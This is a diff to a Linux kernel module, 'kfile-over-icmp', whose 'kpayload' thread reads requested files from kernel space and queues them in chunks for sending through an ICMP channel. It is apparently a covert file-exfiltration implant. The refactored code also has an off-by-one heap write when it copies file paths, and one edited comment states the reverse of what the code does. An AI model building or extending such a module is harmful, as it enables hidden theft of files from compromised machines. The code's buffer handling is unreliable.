@@ -13,21 +13,15 @@ DEFINE_SPINLOCK(g_chunk_list_spinlock);
 struct task_struct* g_payload_generator_thread;
 unsigned int g_payload_generator_thread_stop = 0;
 
-static const char* payload_generator_thread_name = "kgpayload";
-static struct file_metadata current_file;
+static const char* payload_generator_thread_name = "kpayload";
 
 int read_file_thread_func(void* data);
 
-void initialize_file_metadata(struct file_metadata *current_file)
-{
-    current_file->file_path = NULL;
-}
-
-void read_file_chunks(struct file_metadata *current_file)
+void read_file_chunks(const char* file_path)
 {
     // open the file from user-space.
     struct file *filp;
-    filp = filp_open(current_file->file_path, O_RDONLY, 0);
+    filp = filp_open(file_path, O_RDONLY, 0);
     if (IS_ERR(filp)) {
         printk(KERN_ERR "kfile-over-icmp: failed to open file. error: %ld\n", PTR_ERR(filp));
         return;
@@ -37,10 +31,11 @@ void read_file_chunks(struct file_metadata *current_file)
     loff_t file_size = vfs_llseek(filp, 0, SEEK_END);
     loff_t current_position = vfs_llseek(filp, 0, 0);
     if (0 != current_position) {
-        printk(KERN_ERR "kfile-over-icmp: failed to seek back to file's beginning. file path: %s\n", current_file->file_path);
+        printk(KERN_ERR "kfile-over-icmp: failed to seek back to file's beginning. file path: %s\n", file_path);
         goto cleanup;
     }
 
+    // read the file, split it to chunks and add them to the chunks list
     bool is_first_chunk = true;
     while (current_position < file_size) {
         struct file_chunk *new_chunk = (struct file_chunk *)kmalloc(sizeof(struct file_chunk), GFP_ATOMIC);
@@ -93,7 +88,6 @@ void read_file_chunks(struct file_metadata *current_file)
         ssize_t size_read = vfs_read(filp, new_chunk->data + offset_in_buffer, size_to_read, &current_position);
         set_fs(security_old_fs);
 
-        // update the chunk list and add it to the list
         new_chunk->chunk_size += size_read;
 
         unsigned long flags;
@@ -106,27 +100,17 @@ cleanup:
     filp_close(filp, NULL);
 }
 
-void process_next_pending_file(struct file_metadata *current_file)
-{
-    initialize_file_metadata(current_file);
-    
-    // check if there are pending files. if there isn't - return;
+void process_next_pending_file(void)
+{    
     mutex_lock(&g_requestd_files_list_mutex);
     bool is_list_empty = list_empty(&g_requestd_files_list);
     mutex_unlock(&g_requestd_files_list_mutex);
 
     if (is_list_empty) {
+        // there are no pending files.
         return;    
     }
 
-    // free the previous file path as we are going to process the next one.
-    if (NULL != current_file->file_path) {
-        printk(KERN_DEBUG "kfile-over-icmp: successfully send file %pn\n", current_file->file_path);
-        kfree(current_file->file_path);
-    }
-
-    // acquire g_pending_files_to_be_sent mutex as we don't want anyone to mess
-    // with our list while we are reading its head.
     mutex_lock(&g_requestd_files_list_mutex);
     struct file_metadata *next_pending_file;
     next_pending_file = list_first_entry_or_null(&g_requestd_files_list, struct file_metadata, l_head);
@@ -137,15 +121,15 @@ void process_next_pending_file(struct file_metadata *current_file)
 
     // copy the file path
     size_t next_pending_file_path_length = strlen(next_pending_file->file_path);
-    current_file->file_path = (char*)kmalloc(next_pending_file_path_length, GFP_KERNEL);
-    if (NULL == current_file->file_path) {
+    char *file_path = (char*)kmalloc(next_pending_file_path_length, GFP_KERNEL);
+    if (NULL == file_path) {
         // if we fail to allocate space for the file path - we do not want to remove it from
         // the list so we will be able to reach it in the next time. if we'll delete it right 
         // now - then the file won't be sent.
         return;
     }
-    memcpy(current_file->file_path, next_pending_file->file_path, next_pending_file_path_length + 1);
-    current_file->file_path[next_pending_file_path_length] = 0x00;
+    memcpy(file_path, next_pending_file->file_path, next_pending_file_path_length + 1);
+    file_path[next_pending_file_path_length] = 0x00;
 
     // remove the item from the list of pending files.
     // also, free it as we are responsible for its memory.
@@ -158,7 +142,7 @@ void process_next_pending_file(struct file_metadata *current_file)
 
     // TODO: support saving only X chunks (for dealing with large files)
     // no need to acquire chunks_list_mutex as read_file_chunks does that internally.
-    read_file_chunks(current_file);
+    read_file_chunks(file_path);
 
     return;
 
@@ -172,30 +156,23 @@ int generate_payload(char *buffer, size_t *length)
         return -EINVAL;
     }
 
-    // try to acquire the chunks list lock.
-    // we are using mutex_trylock and not spin_lock to prevent latency in the ICMP communication.
-    // if we succeeded to acquire the lock - send any available chunks.
+    // try to acquire the chunks spinlock.
+    // we are using any blocking function to avoid latency in the ICMP communication.
     unsigned int flags;
     if (!spin_trylock_irqsave(&g_chunk_list_spinlock, flags)) {
         return -EIO;
     }
 
-    // NOTE: from now on we hold the lock! avoid from doing unnecessary stuff.
-
     if (list_empty(&g_chunk_list)) {
-        // no avilable chunks to send.
         goto error_and_spinlock_release;
     }
 
-    // there are chunks to send. 
-    // read the first chunk, remove it from the list and return it to the caller.   
     struct file_chunk *next_chunk;
     next_chunk = list_first_entry_or_null(&g_chunk_list, struct file_chunk, l_head);
     if (NULL == next_chunk) {
         goto error_and_spinlock_release;
     }
 
-    // copy the chunk's data to the caller's buffer.
     memcpy(buffer, next_chunk->data, next_chunk->chunk_size);
     *length = next_chunk->chunk_size;
 
@@ -205,6 +182,7 @@ int generate_payload(char *buffer, size_t *length)
 
 error_and_spinlock_release:
     spin_unlock_irqrestore(&g_chunk_list_spinlock, flags);
+
     return 0;
 }
 
@@ -212,7 +190,7 @@ int read_file_thread_func(void* data)
 {
     while (!g_payload_generator_thread_stop) {
         // no need to use locks as process_next_pending_file does that internally.
-        process_next_pending_file(&current_file);
+        process_next_pending_file();
         // TODO: replace with completion variable later on.
         msleep(3000);
     }
@@ -223,7 +201,6 @@ int read_file_thread_func(void* data)
 int start_payload_generator_thread(void)
 {
     g_get_payload_func = &generate_payload;
-    initialize_file_metadata(&current_file);
     g_payload_generator_thread = kthread_run(read_file_thread_func, NULL, payload_generator_thread_name);
     if (!g_payload_generator_thread) {
         return -EINVAL;
